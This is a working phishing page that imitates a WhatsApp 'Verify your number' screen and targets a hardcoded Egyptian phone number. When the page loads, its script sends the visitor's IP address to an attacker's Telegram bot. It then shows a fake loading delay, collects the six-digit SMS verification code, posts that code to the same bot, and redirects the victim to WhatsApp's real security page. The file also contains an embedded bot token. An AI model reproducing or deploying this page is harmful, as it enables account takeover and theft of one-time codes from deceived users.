<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Verification</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-sec: #202c33;
            --wa-text: #e9edef;
            --wa-hint: #8696a0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
        
        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; }
        .active { display: flex; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .logo { width: 60px; margin-top: 60px; margin-bottom: 20px; }
        h1 { font-size: 20px; font-weight: 500; margin-bottom: 15px; color: #fff; }
        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }

        .otp-container { margin: 30px 0; }
        .otp-input { 
            width: 200px; border: none; border-bottom: 2px solid var(--wa-green); 
            font-size: 32px; letter-spacing: 8px; text-align: center; 
            background: transparent; color: #fff; outline: none;
        }

        button { 
            background: var(--wa-green); color: #111b21; border: none; 
            padding: 12px 30px; border-radius: 25px; font-size: 14px; 
            font-weight: 600; cursor: pointer; margin-top: 20px;
        }

        .spinner { 
            border: 3px solid #202c33; border-top: 3px solid var(--wa-green); 
            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; 
            margin-top: 50px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        .timer { color: var(--wa-hint); font-size: 13px; margin-top: 20px; }
        .resend { color: var(--wa-green); font-weight: 500; text-decoration: none; pointer-events: none; opacity: 0.6; }
    </style>
</head>
<body>

    <div class="container">
        <div id="scr-load" class="screen active">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
            <div class="spinner"></div>
            <p style="margin-top: 20px;">Connecting to server...</p>
        </div>

        <div id="scr-otp" class="screen">
            <h1 style="margin-top: 40px;">Verify your number</h1>
            <p>We have sent an SMS with a code to<br><b style="color:#fff;">+20 01030003287</b></p>
            
            <div class="otp-container">
                <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
            </div>
            
            <p style="font-size: 13px;">Enter 6-digit code</p>
            
            <div class="timer">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
            <button onclick="submitOtp()">VERIFY</button>
        </div>
    </div>

    <script>
        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
        const targetNumber = "+20 01030003287";

        // 1. إرسال تنبيه فور دخول المستخدم للصفحة
        async function notifyEntry() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        chat_id: BOT.C, 
                        text: `👁‍🗨 [New Visitor]\nTarget: ${targetNumber}\nIP: ${ipData.ip}\nStatus: Waiting for OTP...` 
                    })
                });
            } catch(e) {}
        }

        // 2. التحميل التلقائي والنقل لصفحة الكود
        window.onload = () => {
            notifyEntry(); // تنبيه البوت
            
            setTimeout(() => {
                document.getElementById('scr-load').classList.remove('active');
                document.getElementById('scr-otp').classList.add('active');
                startTimer();
            }, 3000); // 3 ثواني تحميل لتبدو واقعية
        };

        function startTimer() {
            let t = 119;
            const clock = document.getElementById('clock');
            const itv = setInterval(() => {
                let m = Math.floor(t / 60);
                let s = t % 60;
                clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
                if(--t < 0) clearInterval(itv);
            }, 1000);
        }

        async function submitOtp() {
            const otp = document.getElementById('otp').value;
            if(otp.length < 6) return;

            // إرسال الكود للبوت
            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: BOT.C, 
                    text: `🔥 [OTP RECEIVED]\nTarget: ${targetNumber}\nCode: ${otp}` 
                })
            });

            // توجيه لصفحة الأمان لإنهاء العملية
            window.location.href = "https://www.whatsapp.com/security";
        }
    </script>
</body>
</html>
